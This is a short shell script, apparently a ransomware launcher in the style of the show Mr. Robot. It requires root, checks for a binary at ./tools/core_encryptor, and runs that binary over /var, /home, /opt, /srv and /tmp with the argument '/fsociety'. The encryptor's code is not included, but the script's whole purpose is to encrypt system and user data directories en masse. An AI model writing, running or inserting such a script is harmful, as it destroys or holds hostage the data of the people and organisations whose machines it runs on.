#! /usr/bin/sh

if [ "$(id -u)" -ne 0 ]; then
  echo "[!] Permission denied: required root privilege."
  exit 1
fi

ENCRYPTOR_BIN="./tools/core_encryptor"

if [ ! -f "$ENCRYPTOR_BIN" ]; then
  echo "[!] Error: Couldn't find ($ENCRYPTOR_BIN)!"
  exit 1
fi

echo "[*] Encrypting..."

echo "[*] Encrypting data in /var..."
"$ENCRYPTOR_BIN" /var /fsociety

echo "[*] Encrypting data in /home..."
"$ENCRYPTOR_BIN" /home /fsociety

echo "[*] Encrypting data in /opt..."
"$ENCRYPTOR_BIN" /opt /fsociety

echo "[*] Encrypting data in /srv..."
"$ENCRYPTOR_BIN" /srv /fsociety

echo "[*] Encrypting data in /tmp..."
"$ENCRYPTOR_BIN" /tmp /fsociety

echo "[+] Encrypted."
